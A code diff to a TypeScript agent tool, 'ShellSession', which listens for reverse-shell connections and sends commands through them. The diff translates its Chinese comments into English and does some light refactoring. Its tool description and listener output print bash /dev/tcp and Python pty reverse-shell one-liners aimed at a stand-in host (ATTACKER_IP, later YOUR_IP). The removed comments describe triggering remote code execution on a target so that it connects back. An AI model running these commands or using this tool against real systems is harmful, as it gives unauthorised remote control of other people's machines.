@@ -1,19 +1,15 @@
 /**
- * ShellSession — 反弹 shell 会话管理
+ * ShellSession — persistent shell session management.
  *
- * 解决"拿到反弹 shell 后无法持续交互"的问题。
- * 维护持久 TCP 连接，支持多次 exec。
- *
- * 典型流程：
- *   1. ShellSession({ action: "listen", port: 4444 })
- *   2. 触发目标 RCE，让目标反弹到 ATTACKER_IP:4444
- *   3. ShellSession({ action: "exec", session_id: "shell_4444", command: "id" })
+ * Maintains a persistent TCP listener for inbound connections (e.g. reverse
+ * shells) and supports multiple exec calls against an established session.
  */
 
 import * as net from 'net'
 import * as fs from 'fs'
 import * as path from 'path'
 import type { Tool, ToolContext, ToolDefinition, ToolResult } from '../core/types.js'
+import { str } from '../core/strings.js'
 
 interface ShellConn {
   id:           string
@@ -30,7 +26,7 @@ const _sessions = new Map<string, ShellConn>()
 function sessionId(port: number): string { return `shell_${port}` }
 
 function resolveId(input: Record<string, unknown>): string {
-  if (input.session_id) return String(input.session_id)
+  if (input.session_id) return str(input.session_id)
   if (input.port) return sessionId(Number(input.port))
   return 'shell_4444'
 }
@@ -45,6 +41,14 @@ function stripEcho(output: string, command: string): string {
   return output
 }
 
+// eslint-disable-next-line no-useless-escape -- \/ inside char class aids readability
+const REGEX_SPECIAL_RE = /[-\/\\^$*+?.()|[\]{}]/g
+
+/** Escape regex special characters in a string so it can be used in new RegExp() */
+function escapeRegex(s: string): string {
+  return s.replace(REGEX_SPECIAL_RE, '\\$&')
+}
+
 export class ShellSessionTool implements Tool {
   name = 'ShellSession'
 
@@ -52,19 +56,19 @@ export class ShellSessionTool implements Tool {
     type: 'function',
     function: {
       name: 'ShellSession',
-      description: `管理反弹 shell 会话。提供持久化 TCP 监听器和交互式命令执行。
+      description: `Manage persistent shell sessions. Provides a TCP listener and interactive command execution.
 
-## 操作
-| action | 用途 |
-|--------|------|
-| listen | 在指定端口启动 TCP 监听器，等待反弹 shell 连入 |
-| exec   | 向已建立的 shell 发送命令并获取输出（可多次调用） |
-| list   | 列出所有活跃会话及状态 |
-| kill   | 关闭指定会话 |
+## Actions
+| action | purpose |
+|--------|---------|
+| listen | Start a TCP listener on a port, waiting for an inbound shell connection |
+| exec   | Send a command to an established shell and get output (callable multiple times) |
+| list   | List all active sessions and their status |
+| kill   | Close a specific session |
 
-## 典型工作流
+## Typical workflow
 1. ShellSession({ action: "listen", port: 4444 })
-2. 触发反弹 shell: bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
+2. On the remote machine, initiate a connection back: bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'
 3. ShellSession({ action: "exec", session_id: "shell_4444", command: "id" })`,
       parameters: {
         type: 'object',
@@ -82,20 +86,20 @@ export class ShellSessionTool implements Tool {
   }
 
   async execute(input: Record<string, unknown>, _context: ToolContext): Promise<ToolResult> {
-    switch (String(input.action)) {
+    switch (str(input.action)) {
       case 'listen': return this._listen(input)
       case 'exec':   return this._exec(input)
       case 'list':   return this._list()
       case 'kill':   return this._kill(input)
       default:
-        return { content: `Unknown action "${input.action}". Use: listen | exec | list | kill`, isError: true }
+        return { content: `Unknown action "${str(input.action)}". Use: listen | exec | list | kill`, isError: true }
     }
   }
 
   private _listen(input: Record<string, unknown>): Promise<ToolResult> {
     const port   = Number(input.port ?? 4444)
     const id     = sessionId(port)
-    const logDir = String(input.log_dir ?? '/tmp')
+    const logDir = str(input.log_dir, '/tmp')
 
     if (_sessions.has(id)) {
       const s = _sessions.get(id)!
@@ -127,9 +131,9 @@ export class ShellSessionTool implements Tool {
             `[ShellSession] Listening on 0.0.0.0:${port}  (session: ${id})`,
             `Log: ${logFile}`,
             ``,
-            `Trigger reverse shell on target:`,
-            `  bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/${port} 0>&1'`,
-            `  python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`,
+            `On the remote machine, connect back:`,
+            `  bash -c 'bash -i >& /dev/tcp/YOUR_IP/${port} 0>&1'`,
+            `  python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("YOUR_IP",${port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`,
             ``,
             `After connect: ShellSession({ action: "exec", session_id: "${id}", command: "id" })`,
           ].join('\n'),
@@ -141,7 +145,7 @@ export class ShellSessionTool implements Tool {
 
   private _exec(input: Record<string, unknown>): Promise<ToolResult> {
     const id      = resolveId(input)
-    const command = String(input.command ?? '').trim()
+    const command = str(input.command).trim()
     const timeout = Number(input.timeout ?? 8_000)
 
     if (!command) return Promise.resolve({ content: 'Error: command is required for exec', isError: true })
@@ -165,7 +169,7 @@ export class ShellSessionTool implements Tool {
         if (timeoutTimer) clearTimeout(timeoutTimer)
         socket.removeListener('data', onData)
         let output = Buffer.concat(chunks).toString('utf8')
-        output = output.replace(new RegExp(marker.replace(/[-\/\\^$*+?.()|[\]{}]/g, '\\$&') + '\\r?\\n?', 'g'), '')
+        output = output.replace(new RegExp(escapeRegex(marker) + '\\r?\\n?', 'g'), '')
         output = stripEcho(output, command)
         output = stripPrompt(output)
         resolve({ content: output.trimEnd() || '(empty output)', isError: false })
@@ -233,7 +237,7 @@ export async function executeCommand(
       if (timeoutTimer) clearTimeout(timeoutTimer)
       socket.removeListener('data', onData)
       let output = Buffer.concat(chunks).toString('utf8')
-      output = output.replace(new RegExp(marker.replace(/[-\/\\^$*+?.()|[\]{}]/g, '\\$&') + '\\r?\\n?', 'g'), '')
+      output = output.replace(new RegExp(escapeRegex(marker) + '\\r?\\n?', 'g'), '')
       output = stripEcho(output, command)
       output = stripPrompt(output)
       resolve({ output: output.trimEnd(), success: true, exitCode: 0 })
